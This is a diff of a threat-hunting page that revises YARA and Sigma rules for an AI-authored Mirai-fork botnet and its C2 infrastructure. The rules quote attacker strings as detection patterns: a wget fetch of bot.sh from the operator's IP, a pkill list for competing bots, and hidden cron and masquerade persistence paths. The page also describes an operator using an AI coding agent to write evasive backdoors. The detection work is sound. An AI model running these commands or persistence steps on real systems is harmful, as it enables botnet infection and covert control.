+**Rationale:** Cross-3-operator confirmed universal subset (verbose docstrings, bare-except handlers, educational variable names, emoji-in-output bleed, version-numbered file chains) of the AI-Generated Code Structural Signature. The structural criteria are durable (survive renaming, target code structure not literal names), but verbose docstrings and bare-except are common in legitimate Python code — the original author explicitly flagged this for analyst triage rather than automated block, which is the definition of the Hunting tier. Unchanged from the original file.
+**False Positives:** Verbose docstrings and bare-except handlers are common in legitimate Python code; the multi-criteria co-occurrence gate reduces but does not eliminate this. Deploy for analyst triage, not automated block.
+**Deployment:** Code repository scanner, Python script analyst triage, threat hunting in developer-accessible environments. Do NOT deploy as automated block.
+
+```yara
+rule MAL_Python_AIGenerated_OffensiveCode_Universal_Subset {
+   meta:
+      description = "Cross-operator detection for AI-generated offensive Python code using the 5-criteria universal subset confirmed across 3 independent operators (Russian Gemini, Turkish ARPA, English Rovodev). Detects co-occurrence of verbose docstrings, bare-except handlers, educational variable naming, emoji-in-output bleed, and version-numbered iteration chains. High FP risk in isolation; requires multi-criteria co-occurrence gate — analyst triage, not automated block."
+      license = "CC BY 4.0 - https://creativecommons.org/licenses/by/4.0/"
+      author = "The Hunters Ledger"
+      reference = "https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/"
+      date = "2026-05-26"
+      hash1 = "64ca12cae6f5e520abb4158da3bbc14e909c2128748ae0c5806fa4206cc14260"
+      family = "AI-Generated Offensive Code"
+      malware_type = "Offensive Python (AI-authored)"
+      campaign = "ai-agent-frameworks-2026-05-23"
+      id = "38aeca8a-3dad-5b61-9787-a14edf92a250"
+   strings:
+      $bare_except1 = "except:" ascii
+      $bare_except2 = "except Exception:" ascii
+      $bare_pass    = /except[^\n]*:\s*\n\s*pass/ ascii
+      $doc_attack   = /def \w+_attack\w*\(.*\):\s*\n\s+\"\"\"/ ascii
+      $doc_flood    = /def \w+_flood\w*\(.*\):\s*\n\s+\"\"\"/ ascii
+      $doc_scan     = /def \w+_scan\w*\(.*\):\s*\n\s+\"\"\"/ ascii
+      $doc_infect   = /def \w+_infect\w*\(.*\):\s*\n\s+\"\"\"/ ascii
+      $emoji_fire   = "\xf0\x9f\x94\xa5" ascii
+      $emoji_rocket = "\xf0\x9f\x9a\x80" ascii
+      $emoji_check  = "\xe2\x9c\x85"     ascii
+      $ver_chain_v2 = "_v2." ascii
+      $ver_chain_v3 = "_v3." ascii
+      $ver_chain_v4 = "_v4." ascii
+      $ctx_ddos  = "ddos" nocase ascii
+      $ctx_flood = "flood" nocase ascii
+      $ctx_brute = "brute" nocase ascii
+      $ctx_infect = "infect" nocase ascii
+      $ctx_cnc   = "cnc" nocase ascii
+   condition:
+      filesize < 500KB and
+      (uint16(0) == 0x2123 or $bare_except1 or $bare_except2) and
+      (1 of ($ctx_*)) and
+      (
+         ($bare_pass and 1 of ($doc_*)) or
+         (1 of ($emoji_*) and 1 of ($doc_*)) or
+         (2 of ($ver_chain_v2, $ver_chain_v3, $ver_chain_v4) and 1 of ($doc_*))
+      )
+}
+```
+
+#### MAL_Python_StealthAgent_AntiDebug_AntiVM_AI_Authored
+
+**Tier:** Hunting
+**Robustness:** 2
+**ATT&CK Coverage:** T1014 (Rootkit), T1059.006 (Python), T1497.001 (System Checks — MODERATE), T1587.001 (Develop Capabilities: Malware)
+**Confidence:** MODERATE
+**Rationale:** Salvaged from the original — the condition mandated the hardcoded C2 endpoint `87.106.143.220` as an AND-gate across every branch, so the rule died the instant the operator rotated infrastructure (the IP is already carried in the IOC feed). Removed the IP/port strings and condition dependency entirely, leaving a pure anti-analysis feature-bucket signature (anti_debug + anti_vm + sandbox keyword co-occurrence with rootkit/self-destruct, or the AES-GCM+PBKDF2+handshake crypto framing, or polymorphic+bare-except). These are generic English feature-name strings individually (per the "no generic API-name `any of them`" YARA anti-pattern), so co-occurrence is required but the combination is still not goodware-validated to zero FP — Hunting, not Detection.
+**False Positives:** Legitimate Python security/red-team tooling that legitimately implements anti-debug/anti-VM checks alongside self-destruct or rootkit-adjacent terminology (uncommon but not impossible); the AES-GCM+PBKDF2+handshake branch alone is common to many encrypted-messaging implementations.
+**Deployment:** Linux filesystem scanner (Python scripts), EDR behavioral monitoring for Python processes with anti-VM API calls; corroborate with the family-specific YARA/Sigma rules above before high-confidence attribution.
+
+```yara
+rule MAL_Python_StealthAgent_AntiDebug_AntiVM_AI_Authored {
+   meta:
+      description = "Detects stealth_agent.py-class AI-authored Python backdoors combining anti-debug, anti-VM, sandbox evasion, process hiding, rootkit install, systemd/cron persistence, self-destruct, and polymorphic payload generation with bare-except AI-code signature. Family-generic anti-analysis feature bucket — deploy as a hunting/triage lead, not standalone attribution."
+      license = "CC BY 4.0 - https://creativecommons.org/licenses/by/4.0/"
+      author = "The Hunters Ledger"
+      reference = "https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/"
+      date = "2026-05-26"
+      hash1 = "d1086ab3c06764ffd81492b4c723bda83bac19dc101c8542bc566e5888c92da3"
+      family = "Matrix C2"
+      malware_type = "Stealth Agent (AI-authored backdoor)"
+      campaign = "UTA-2026-014"
+      id = "d4482d80-a943-5693-86d2-773c22063b33"
+   strings:
+      $anti_debug = "anti_debug" ascii nocase
+      $anti_vm    = "anti_vm" ascii nocase
+      $sandbox_chk = "sandbox" ascii nocase
+      $rootkit    = "rootkit" ascii nocase
+      $self_dest  = "self_destruct" ascii nocase
+      $polymorphic = "polymorphic" ascii nocase
+      $aes_gcm    = "AES-256-GCM" ascii
+      $pbkdf2     = "PBKDF2" ascii
+      $handshake  = "handshake" ascii nocase
+      $bare_exc   = "except:" ascii
+   condition:
+      filesize < 500KB and
+      (
+         (2 of ($anti_debug, $anti_vm, $sandbox_chk) and ($rootkit or $self_dest)) or
+         ($aes_gcm and $pbkdf2 and $handshake) or
+         ($polymorphic and $bare_exc)
+      )
+}
+```
+
+**Rovodev Operator Artifacts**
+
+#### MAL_Markdown_Rovodev_WhatINeed_OperatorPrompt
+
+**Tier:** Hunting
+**Robustness:** 1
 **ATT&CK Coverage:** T1587.001 (Develop Capabilities: Malware), T1059.006 (Python)
-**Confidence:** HIGH for this operator's specific artifact; MODERATE for class-level detection (other operators may phrase prompts differently)
-**False Positive Risk:** LOW — the combination of C2 debugging + exploit scanning + credential harvesting + Discord integration in a single text file is not a legitimate developer pattern; "automatic give me login" is an offensive-intent phrase with near-zero legitimate use
-**Deployment:** Filesystem scanner on suspected operator hosts, web crawler for open-directory detection
+**Confidence:** HIGH for this operator's specific artifact; MODERATE for class-level detection
+**Rationale:** Detects the literal phrasing of one operator's natural-language prompt file to Rovodev. The value here is narrow-but-real pivot/hunting utility (re-uploads of this exact artifact, or this operator reusing phrasing elsewhere) rather than a generalizable technique — a different operator phrasing an equivalent request would not match. Retiered to Hunting per the single-artifact durability profile; the original author's own MEDIUM detection-priority framing already signaled this. Unchanged detection logic.
+**False Positives:** Low but not zero — the combination of C2-debugging + credential-harvesting + Discord-integration phrasing in one file is not a legitimate developer pattern, but this rule cannot generalize past this operator's specific artifact.
+**Deployment:** Filesystem scanner on suspected operator hosts, web crawler for open-directory detection (pivot/hunting use, not automated alerting).
 
 ```yara
 rule MAL_Markdown_Rovodev_WhatINeed_OperatorPrompt {
@@ -364,19 +500,12 @@ rule MAL_Markdown_Rovodev_WhatINeed_OperatorPrompt {
       campaign = "UTA-2026-014"
       id = "3e3d1343-158e-5030-b682-3a90eb4966ef"
    strings:
-      // Operator's exact C2-debug request phrase
       $c2_debug   = "c2 doesn't connect" ascii nocase
-      // GitHub C2-Leak reference pattern (operator references upstream code source)
       $c2_leak    = "C2-Leak" ascii
-      // Offensive-intent credential harvesting phrase
       $auto_login = "automatic give me login" ascii nocase
-      // Discord integration request (operator's customer-facing channel)
       $discord_req = "make discord live" ascii nocase
-      // Operator Discord user-ID disclosure
       $discord_id  = "1441591352927326259" ascii
-      // Anti-forensic cleanup request
       $cleanup_req = "clean files not needed" ascii nocase
-      // Escalation request ("modern methods" / "more stuff to make it stronger")
       $stronger    = "make it stronger" ascii nocase
    condition:
       filesize < 10KB and
@@ -389,178 +518,20 @@ rule MAL_Markdown_Rovodev_WhatINeed_OperatorPrompt {
 }
 ```
 
----
+#### MAL_Discord_OperatorID_Snowflake_PandoraNet
 
-### Rule 7 — MAL_Python_StealthAgent_AntiDebug_AntiVM_AI_Authored
-
-**Detection Priority:** MEDIUM
-**Rationale:** `stealth_agent.py` combines anti-debug + anti-VM + sandbox checks + persistence + self-destruct + polymorphic payload in a single AI-authored Python file. The co-occurrence of these features with bare-except handlers, verbose docstrings, and the specific C2 endpoint `87.106.143.220:1337` is specific to this file. Refines AI-Generated Code Signature item #4 (zero anti-analysis = PROMPT-CONDITIONAL, not structural — escalated prompts produce AI-authored code WITH evasion features).
-**ATT&CK Coverage:** T1014 (Rootkit), T1059.006 (Python), T1497.001 (System Checks), T1587.001 (Develop Capabilities: Malware)
-**Confidence:** HIGH — file captured directly from Rovodev session JSON file_write tool call; C2 endpoint hardcoded and confirmed
-**False Positive Risk:** LOW — specific C2 endpoint `87.106.143.220:1337` combined with self-destruct + anti-VM + rootkit keywords is not found in legitimate Python security tools
-**Deployment:** Linux filesystem scanner (Python scripts), EDR behavioral monitoring for Python processes with anti-VM API calls
-
-```yara
-rule MAL_Python_StealthAgent_AntiDebug_AntiVM_AI_Authored {
-   meta:
-      description = "Detects stealth_agent.py-class AI-authored Python backdoor connecting to 87.106.143.220:1337. Authored via escalated Rovodev prompt producing anti-debug, anti-VM, sandbox evasion, process hiding, rootkit install, systemd/cron persistence, self-destruct, and polymorphic payload generation combined with bare-except AI-code signature. Refines AI-Generated Code Signature criterion #4 (zero anti-analysis is PROMPT-CONDITIONAL, not structural)."
-      license = "CC BY 4.0 - https://creativecommons.org/licenses/by/4.0/"
-      author = "The Hunters Ledger"
-      reference = "https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/"
-      date = "2026-05-26"
-      hash1 = "d1086ab3c06764ffd81492b4c723bda83bac19dc101c8542bc566e5888c92da3"
-      family = "Matrix C2"
-      malware_type = "Stealth Agent (AI-authored backdoor)"
-      campaign = "UTA-2026-014"
-      id = "d4482d80-a943-5693-86d2-773c22063b33"
-   strings:
-      // C2 endpoint (operator-OWNED Matrix C2 — hardcoded in agent)
-      $cnc_ip     = "87.106.143.220" ascii
-      $cnc_port   = "1337" ascii
-      // Anti-analysis feature keywords (per Hunt aiBrief)
-      $anti_debug = "anti_debug" ascii nocase
-      $anti_vm    = "anti_vm" ascii nocase
-      $sandbox_chk = "sandbox" ascii nocase
-      // Rootkit + persistence features
-      $rootkit    = "rootkit" ascii nocase
-      $self_dest  = "self_destruct" ascii nocase
-      $polymorphic = "polymorphic" ascii nocase
-      // AES-256-GCM encryption markers (encrypted_agent.py siblings)
-      $aes_gcm    = "AES-256-GCM" ascii
-      $pbkdf2     = "PBKDF2" ascii
-      $handshake  = "handshake" ascii nocase
-      // AI-Generated Code Signature bare-except (structural AI-authorship marker)
-      $bare_exc   = "except:" ascii
-   condition:
-      filesize < 500KB and
-      $cnc_ip and
-      (
-         (2 of ($anti_debug, $anti_vm, $sandbox_chk) and ($rootkit or $self_dest)) or
-         ($aes_gcm and $pbkdf2 and $handshake) or
-         ($polymorphic and $bare_exc and $cnc_port)
-      )
-}
-```
-
----
-
-### Rule 8 — MAL_JSON_Rovodev_SessionContext_FileWrite_Authoring
-
-**Detection Priority:** MEDIUM
-**Rationale:** Captures operator-exposed Rovodev session_context.json and rovodev.log files that document the AI co-authoring workflow in detail. The `file_write` tool call pattern with `initial_content` payload starting with Python shebang lines, combined with `session_context.json` filename and large file size (1.24 MB), is specific to AI coding-agent session artifacts. Useful for hunting exposed operator-OPSEC failures on web servers.
-**ATT&CK Coverage:** T1587.001 (Develop Capabilities: Malware)
-**Confidence:** HIGH for this specific operator's session artifacts; HIGH for Rovodev-class session JSON pattern generally
-**False Positive Risk:** LOW for the specific keyword combination; MEDIUM for `session_context.json` alone (legitimate app uses). Require multiple field co-occurrence.
-**Deployment:** Web crawler for open-directory detection, filesystem scanner on suspected operator hosts
-
-```yara
-rule MAL_JSON_Rovodev_SessionContext_FileWrite_Authoring {
-   meta:
-      description = "Detects operator-exposed Atlassian Rovodev AI coding agent session artifacts (session_context.json / rovodev.log) containing file_write tool calls with offensive Python initial_content payloads. These session JSONs document end-to-end AI co-authoring of offensive frameworks. The 257b6faf session (1.24 MB) and 8b911ec6 session (176 KB) captured from operator's 87.106.143.220 open-directory are the primary artifact class."
-      license = "CC BY 4.0 - https://creativecommons.org/licenses/by/4.0/"
-      author = "The Hunters Ledger"
-      reference = "https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/"
-      date = "2026-05-26"
-      hash1 = "9eece9f46bc420b53884d4292622621c9960459c1d7a73635420771e7d0aa1fa"
-      family = "Rovodev Operator Artifacts"
-      malware_type = "AI Coding Agent Session Artifact"
-      campaign = "UTA-2026-014"
-      id = "826c0fe7-b1fc-5689-9fd7-69e2abc40277"
-   strings:
-      // Rovodev session JSON key patterns
-      $session_key = "session_context" ascii
-      $tool_call   = "file_write" ascii
-      $init_content = "initial_content" ascii
-      // Rovodev log file pattern
-      $rovo_log    = "rovodev.log" ascii
-      // Python shebang in file_write payloads (offensive Python content)
-      $py_shebang  = "#!/usr/bin/env python3" ascii
-      // Session UUID patterns (operator's two sessions)
-      $sess_257    = "257b6faf-6426-47e9-8458-381befca3ef5" ascii
-      $sess_8b9    = "8b911ec6-186f-423a-aa74-7b5d17e4d9ca" ascii
-      // AI-generated offensive content markers within session
-      $mass_infect = "Launch mass infection campaign" ascii
-      $c2_header   = "MATRIX C2" ascii
-   condition:
-      filesize < 2MB and
-      (
-         ($session_key and $tool_call and $init_content and $py_shebang) or
-         ($sess_257 or $sess_8b9) or
-         ($tool_call and $mass_infect) or
-         ($rovo_log and $c2_header)
-      )
-}
-```
-
----
-
-### Rule 9 — MAL_Python_Persistent_Bot_DualChannel_CNC
-
-**Detection Priority:** MEDIUM
-**Rationale:** `persistent_bot.sh`-class operators scripts implement the 5-vector persistence pattern plus dual-channel CNC architecture (HTTPS:443 build/test + HTTP:80 deploy). The `bot_register` JSON message with `bot_type` + `arch` + `vendor` fields sent to `87.106.143.220:1337` via netcat is specific to this operator's wire format. The 5-persistence-vector pattern (cron .cache_update + rc.local + init.d/sysupdate + systemd system-update.service + bashrc/profile) is a trackable operator signature.
-**ATT&CK Coverage:** T1037.004 (RC Scripts), T1053.003 (Cron), T1059.004 (Unix Shell), T1071.001 (Web Protocols), T1543.002 (Systemd Service), T1546.004 (Unix Shell Configuration Modification)
-**Confidence:** HIGH — script captured directly from operator infrastructure at known hash; all field patterns confirmed
-**False Positive Risk:** LOW — specific JSON wire format (`bot_type`, `arch`, `vendor` fields combined with `bot_register` type) to `87.106.143.220:1337` is unique to this operator; hidden `.cache_update` cron entry combined with `sysupdate` service narrows FP surface significantly
-**Deployment:** Linux filesystem scanner (bash scripts), EDR persistence monitoring for cron/init.d/systemd creation events
-
-```yara
-rule MAL_Python_Persistent_Bot_DualChannel_CNC {
-   meta:
-      description = "Detects persistent_bot.sh-class operator scripts implementing 5-vector Linux persistence and dual-channel CNC architecture. Identifies operator-specific JSON wire format (bot_register + heartbeat messages with bot_type/arch/vendor fields) to Matrix C2 at 87.106.143.220:1337, hidden cron entry /etc/cron.d/.cache_update, and masquerade persistence (sysupdate init.d service + system-update.service systemd unit)."
-      license = "CC BY 4.0 - https://creativecommons.org/licenses/by/4.0/"
-      author = "The Hunters Ledger"
-      reference = "https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/"
-      date = "2026-05-26"
-      hash1 = "4809a7ee9f5dbcbe86cfbd77a45e2a268a37bcc947e8e1621164df653597948b"
-      family = "Matrix C2"
-      malware_type = "Persistence Installer (AI-authored)"
-      campaign = "UTA-2026-014"
-      id = "91f7bf1a-6620-50cf-81c0-ff7faf1328e3"
-   strings:
-      // JSON wire format — bot_register message fields
-      $wire_reg   = "\"type\":\"bot_register\"" ascii
-      $wire_arch  = "\"arch\":\"$arch\"" ascii
-      $wire_vendor = "\"vendor\":\"$vendor\"" ascii
-      $wire_hb    = "\"type\":\"heartbeat\"" ascii
-      // C2 endpoint
-      $cnc_ep     = "87.106.143.220" ascii
-      $cnc_port   = "1337" ascii
-      // Hidden cron entry (operator-specific filename)
-      $cron_hidden = "/etc/cron.d/.cache_update" ascii
-      // Masquerade persistence filenames
-      $initd_mask  = "/etc/init.d/sysupdate" ascii
-      $systemd_mask = "/etc/systemd/system/system-update.service" ascii
-      // Reseed channel (persistence downloads from operator VPS)
-      $reseed     = "wget -qO- http://87.106.143.220/bot.sh" ascii
-      // Competitor kill list
-      $kill_comp  = "pkill -9 -f \"(mirai|qbot|tsunami|gafgyt|bashlite|kaiten)\"" ascii
-   condition:
-      filesize < 50KB and
-      (
-         ($wire_reg and $cnc_ep) or
-         ($cron_hidden and ($initd_mask or $systemd_mask)) or
-         ($reseed and $kill_comp) or
-         ($wire_hb and $cnc_port and $cron_hidden) or
-         ($wire_arch and $wire_vendor and ($wire_reg or $wire_hb))
-      )
-}
-```
-
----
-
-### Rule 10 — MAL_Discord_OperatorID_Snowflake_PandoraNet
-
-**Detection Priority:** LOW
-**Rationale:** Narrow detection on the literal Discord operator ID `1441591352927326259` as it appears verbatim in operator artifacts (whatineed.txt, potential Discord-related configs). The snowflake decodes to account creation timestamp 2025-11-22T00:49:22 UTC (~182 days old at investigation). This rule catches operator-artifact exposure instances; low deployment priority since the specific operator may rotate accounts, but useful for hunting exposed operator-OPSEC failures.
+**Tier:** Hunting
+**Robustness:** 1
 **ATT&CK Coverage:** T1584.004 (Compromise Infrastructure: Server)
-**Confidence:** HIGH — the Discord ID is operator-self-disclosed in captured artifact; snowflake decode is reproducible
-**False Positive Risk:** LOW — specific 19-digit Discord snowflake ID combined with `PandoraNet` or `bot_register` reduces FP surface to near-zero
-**Deployment:** Filesystem scanner on suspected operator hosts, open-directory crawler, OSINT pivot hunting
+**Confidence:** HIGH for the artifact itself; the underlying pivot value degrades if the operator rotates the Discord account
+**Rationale:** The rule's primary discriminator is the operator's literal 19-digit Discord snowflake ID (`1441591352927326259`) — a single-account artifact an operator can abandon at will (Gate 1 durability: mutex/ID-class single literal). The original author's own rationale already framed this as "a pivot/hunting rule rather than high-confidence detection," which is the Hunting-tier definition; retained here unchanged.
+**False Positives:** Low — the specific 19-digit snowflake combined with `PandoraNet` or the operator's IONOS IPs reduces FP surface to near-zero for this operator's artifacts, but the rule has no value once the operator rotates identity.
+**Deployment:** Filesystem scanner on suspected operator hosts, open-directory crawler, OSINT pivot hunting.
 
 ```yara
 rule MAL_Discord_OperatorID_Snowflake_PandoraNet {
    meta:
-      description = "Narrow detection on the literal Discord operator snowflake ID 1441591352927326259 as it appears in operator artifacts (whatineed.txt prompt, Discord bot configs, operator notes). Snowflake decodes to account creation timestamp 2025-11-22T00:49:22 UTC — fresh ops persona ~182 days old at investigation. Also detects PandoraNet botnet ID co-occurrence in operator-exposed files. Use as a pivot/hunting rule rather than high-confidence detection."
+      description = "Narrow detection on the literal Discord operator snowflake ID 1441591352927326259 as it appears in operator artifacts (whatineed.txt prompt, Discord bot configs, operator notes). Snowflake decodes to account creation timestamp 2025-11-22T00:49:22 UTC. Also detects PandoraNet botnet ID co-occurrence in operator-exposed files. Pivot/hunting rule, not high-confidence detection."
       license = "CC BY 4.0 - https://creativecommons.org/licenses/by/4.0/"
       author = "The Hunters Ledger"
       reference = "https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/"
@@ -571,14 +542,10 @@ rule MAL_Discord_OperatorID_Snowflake_PandoraNet {
       campaign = "UTA-2026-014"
       id = "584bfc4c-dccc-5e4e-ad2c-7d0d16e6832c"
    strings:
-      // Operator-self-disclosed Discord ID (from whatineed.txt)
       $discord_id  = "1441591352927326259" ascii
-      // PandoraNet botnet ID (operator-bespoke; not observed in any other host in Hunt 365-day index)
       $pandoranet  = "PandoraNet" ascii fullword
-      // Operator infrastructure references
       $ionos_ip    = "87.106.143.220" ascii
       $backup_ip   = "87.106.54.213" ascii
-      // Context anchors
       $my_user     = "my user ID is" ascii nocase
       $discord_ctx = "discord" nocase ascii
    condition:
@@ -596,17 +563,21 @@ rule MAL_Discord_OperatorID_Snowflake_PandoraNet {
 
 ## Sigma Rules
 
-### Pandora-Mirai (Naku ELF Bot Suite)
+### Detection Rules
 
----
+**Pandora-Mirai (Naku ELF Bot Suite)**
 
-### Sigma Rule 1 — ELF Arch-Tagged Filename Execution (Naku/Pandora Family)
+#### ELF IoT Arch-Tagged Filename Execution on Linux Server — Naku/Pandora Mirai Family
 
-**Detection Priority:** HIGH
-**Rationale:** Naku.{arch} and pandora.{arch} filenames with architecture-tag suffixes (arm, arm5, arm6, arm7, m68k, mips, mpsl, ppc, sh4, spc, x86) combined with process execution on Linux servers is specific to this and related Mirai-fork dropper families. IoT arch suffixes in executable filenames on server hosts are high-confidence malicious indicators.
+**Tier:** Detection
+**Robustness:** 2
 **ATT&CK Coverage:** T1059.004 (Unix Shell), T1190 (Exploit Public-Facing Application)
 **Confidence:** HIGH
-**False Positive Risk:** LOW — `.arm5`, `.m68k`, `.mpsl`, `.spc` suffixes on executables on server hosts have no legitimate software use case; `.arm` and `.x86` suffixes are slightly more common but rare in combination with `Naku` or `pandora` prefixes
+**Rationale:** IoT-targeted architecture-tag suffixes (`.arm5`, `.m68k`, `.mpsl`, `.spc`, etc.) on ELF binaries executing on a Linux SERVER host are never a legitimate pattern — arch-tagged filenames only make sense on IoT/embedded build or distribution systems. Evading requires renaming the entire 11-binary set, which raises the bar beyond a single literal. Unchanged from the original file.
+**False Positives:** Cross-compilation test environments deploying IoT firmware — limit to production server hosts and IoT-adjacent network segments; IoT development workstations building multi-arch toolchains.
+**Blind Spots:** A rename of the entire arch-tagged binary set evades; scoped to `product: linux` process_creation telemetry only.
+**Validation:** Execute a Naku/Pandora binary with an arch-tag filename on a monitored Linux host — must match; a legitimate cross-compilation toolchain building the same arch set under different naming must NOT fire.
+**Deployment:** EDR/Sysmon-equivalent process-creation telemetry on Linux server fleets and IoT-adjacent segments.
 
 ```yaml
 title: ELF IoT Arch-Tagged Filename Execution on Linux Server — Naku/Pandora Mirai Family
@@ -659,22 +630,24 @@ falsepositives:
 level: high
 ```
 
----
+#### Hidden-Prefix Cron Entry Creation in /etc/cron.d — Pandora-Mirai Persistence Pattern
 
-### Sigma Rule 2 — Hidden-Filename-Prefix Cron Entry Creation
-
-**Detection Priority:** HIGH
-**Rationale:** `/etc/cron.d/.cache_update` uses a dot-prefix hidden-filename to evade `ls /etc/cron.d/` output on most terminal prompts. Cron entry creation with dot-prefix filenames in `/etc/cron.d/` is a specific evasion technique used by this operator (and other Mirai-family malware) to survive `crontab -l` checks and blunt incident response.
+**Tier:** Detection
+**Robustness:** 3
 **ATT&CK Coverage:** T1053.003 (Cron), T1564.001 (Hidden Files and Directories)
 **Confidence:** HIGH
-**False Positive Risk:** LOW — hidden-prefix cron entries in `/etc/cron.d/` are not a standard system administration practice; dot-prefix files in this directory are almost exclusively malicious on production servers
+**Rationale:** A pure technique-level signal — dot-prefix hidden cron entries in `/etc/cron.d/` — with zero operator-specific literals (no IP, no domain, no bespoke filename). Survives complete infrastructure rotation and full binary/campaign rebrand; only a change in the persistence *technique itself* would evade. Unchanged from the original file.
+**False Positives:** Extremely rare legitimate administration scripts that use dot-prefix cron files — review all instances; configuration management tools (Puppet, Chef, Ansible) deploying hidden cron entries — verify against known CM policy.
+**Blind Spots:** Persistence via a non-hidden cron filename, or via a different mechanism entirely, is not covered by this rule.
+**Validation:** Trigger creation of a dot-prefix file under `/etc/cron.d/` — must match; a legitimate `.placeholder` file (or your environment's known CM hidden-file convention) must NOT fire once filtered.
+**Deployment:** EDR/Sysmon-equivalent file-creation telemetry on Linux hosts.
 
 ```yaml
 title: Hidden-Prefix Cron Entry Creation in /etc/cron.d — Pandora-Mirai Persistence Pattern
 id: 6625f3f7-4e6f-40cb-905b-039786de8561
 status: experimental
 description: >-
-  Detects creation of dot-prefix hidden-filename cron entries in /etc/cron.d/ as used by the Pandora-Mirai (UTA-2026-014) persistent_bot.sh 5-vector persistence installer. The specific entry /etc/cron.d/.cache_update is the operator's primary cron persistence vector, scheduled to wget-pipe bot.sh from 87.106.143.220 every 5 minutes. Hidden-prefix filenames in this directory evade simple cron audits and are not a standard administration pattern.
+  Detects creation of dot-prefix hidden-filename cron entries in /etc/cron.d/ as used by the Pandora-Mirai (UTA-2026-014) persistent_bot.sh 5-vector persistence installer. The specific entry /etc/cron.d/.cache_update is the operator's primary cron persistence vector, scheduled to wget-pipe bot.sh from the operator's infrastructure every 5 minutes. Hidden-prefix filenames in this directory evade simple cron audits and are not a standard administration pattern.
 references:
     - https://the-hunters-ledger.com/reports/rovodev-mirai-matrix-c2-87.106.143.220/
 author: The Hunters Ledger
@@ -703,22 +676,24 @@ falsepositives:
 level: high
 ```
 
----
+#### Pandora-Mirai Persistence Pattern — Multi-Mechanism Installer (Init.d, Systemd, Hidden Cron)
 
-### Sigma Rule 3 — Mirai 5-Vector Persistence Pattern
-
-**Detection Priority:** HIGH
-**Rationale:** The operator's `persistent_bot.sh` writes to 5 persistence vectors within a short execution window: `/etc/cron.d/.cache_update` + `/etc/rc.local` + `/etc/init.d/sysupdate` + `/etc/systemd/system/system-update.service` + `~/.bashrc` + `~/.profile`. No single vector is unique, but the 5-vector pattern within a time window distinguishes this installer from legitimate system configuration.
-**ATT&CK Coverage:** T1037.004 (RC Scripts), T1053.003 (Cron), T1543.002 (Systemd Service), T1546.004 (Unix Shell Configuration Modification)
+**Tier:** Detection
+**Robustness:** 2
+**ATT&CK Coverage:** T1037.004 (RC Scripts), T1053.003 (Cron), T1543.002 (Systemd Service)
 **Confidence:** HIGH
-**False Positive Risk:** MEDIUM — individual persistence mechanisms overlap with legitimate deployment tools; the 5-mechanism window is more specific. Tuning: add time-window correlation (all 5 within 60 seconds) to reduce FP rate.
+**Rationale:** Salvaged from the original — the original rule OR'd in `/etc/rc.local` as a fourth persistence vector, but `/etc/rc.local` modification is routine for many legitimate deployment/provisioning tools and contributed no discriminating value on its own, while the rule's stated "60-second time window" was never actually implemented in the Sigma `condition` (a static OR of pairs has no timeframe). Removed the rc.local vector and the un-implemented timing claim from the description; retiered to require 2-of-3 of the three genuinely distinctive persistence artifacts (masquerade init.d name, masquerade systemd unit name, hidden cron entry).
+**False Positives:** Legitimate system update scripts that use similar naming — verify service content references known-good update infrastructure; security tooling (OSSEC, Wazuh agent) that creates init.d and systemd units at install time.
+**Blind Spots:** A rebuild that renames two or more of the three masquerade/hidden-persistence artifacts evades; no time-window correlation is implemented, so the three artifacts may be observed across a broad search window rather than a tight installer-execution burst.
+**Validation:** Trigger `persistent_bot.sh` — at least 2 of the 3 vectors must be created and match; a host running only one of the three (e.g., just a `sysupdate` init.d script from unrelated legitimate tooling) must NOT fire.
+**Deployment:** EDR/Sysmon-equivalent file-creation telemetry on Linux hosts.
 
 ```yaml
-title: Pandora-Mirai 5-Vector Linux Persistence Pattern — Multi-Mechanism Installer
+title: Pandora-Mirai Persistence Pattern — Multi-Mechanism Installer (Init.d, Systemd, Hidden Cron)
 id: 311787eb-af20-4ec5-90b3-ef3cb6797771
 status: experimental
 description: >-
-  Detects the 5-vector Linux persistence pattern used by the Pandora-Mirai (UTA-2026-014) persistent_bot.sh installer. Monitors for creation of masquerade-named persistence files (/etc/init.d/sysupdate, /etc/systemd/system/system-update.service) alongside shell RC modification and hidden cron entry creation within a short time window. Each vector alone has moderate FP risk; co-occurrence within 60 seconds on a non-deployment host is high-confidence malicious.
+  Detects 2-of-3 co-occurrence of the distinctive Linux persistence vectors used by the Pandora-Mirai (UTA-2026-014) persistent_bot.sh installer — masquerade-named init.d service (/etc/init.d/sysupdate), masquerade systemd unit (/etc/systemd/system/system-update.service), and a hidden dot-prefix cron entry under /etc/cron.d/. Corrected from the original: the ubiquitous /etc/rc.local vector was removed (routine target for many legitimate deployment tools with no discriminating value alone), and the rule no longer claims an un-implemented 60-second time-window correlation.
 references:
     - https://the-hunters-ledger.com/reports/rovodev-mirai-matrix-c2-87.106.143.220/
 author: The Hunters Ledger
@@ -730,7 +705,6 @@ tags:
     - attack.t1037.004
     - attack.t1053.003
     - attack.t1543.002
-    - attack.t1546.004
     - detection.emerging-threats
 logsource:
     category: file_event
@@ -742,38 +716,76 @@ detection:
         TargetFilename: '/etc/systemd/system/system-update.service'
     selection_cron_hidden:
         TargetFilename|startswith: '/etc/cron.d/.'
-    selection_rclocal:
-        TargetFilename: '/etc/rc.local'
     condition: >-
         (selection_sysupdate and selection_systemd) or
         (selection_sysupdate and selection_cron_hidden) or
-        (selection_sysupdate and selection_rclocal) or
-        (selection_systemd and selection_cron_hidden) or
-        (selection_systemd and selection_rclocal) or
-        (selection_cron_hidden and selection_rclocal)
+        (selection_systemd and selection_cron_hidden)
 falsepositives:
     - Legitimate system update scripts that use similar naming — verify service content references known-good update infrastructure
-    - Server provisioning tools (cloud-init, Ansible) creating multiple persistence mechanisms simultaneously — correlate with deployment pipeline activity
     - Security tooling (OSSEC, Wazuh agent) that creates init.d and systemd units at install time
 level: high
 ```
 
----
+#### BusyBox SORA Marker Execution — Sora-Derivative Mirai-Fork Active on Host
 
-### Sigma Rule 4 — PandoraNet Botnet ID in Process Command Line or Environment
-
-**Detection Priority:** HIGH
